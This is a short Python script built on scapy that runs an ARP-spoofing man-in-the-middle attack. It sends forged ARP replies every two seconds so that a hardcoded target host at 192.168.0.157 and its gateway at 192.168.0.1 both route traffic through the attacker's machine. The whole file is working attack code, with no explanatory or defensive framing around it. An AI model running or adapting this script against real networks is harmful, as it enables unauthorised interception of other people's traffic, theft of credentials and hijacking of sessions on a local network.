from scapy.all import Ether, ARP, sendp
import time

target_ip = "192.168.0.157"
target_mac = "fc:b3:bc:c6:bf:65"

gateway_ip = "192.168.0.1"   
gateway_mac = "90:9a:4a:fc:9b:ed" 

packet_to_target = Ether(dst=target_mac) / ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst=target_mac)

packet_to_gateway = Ether(dst=gateway_mac) / ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst=gateway_mac)

print("[+] Starting MitM spoofing... Press Ctrl+C to stop.")

try:
    while True:
        sendp(packet_to_target, verbose=False)
        sendp(packet_to_gateway, verbose=False)
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[-] Stopping spoofing.")
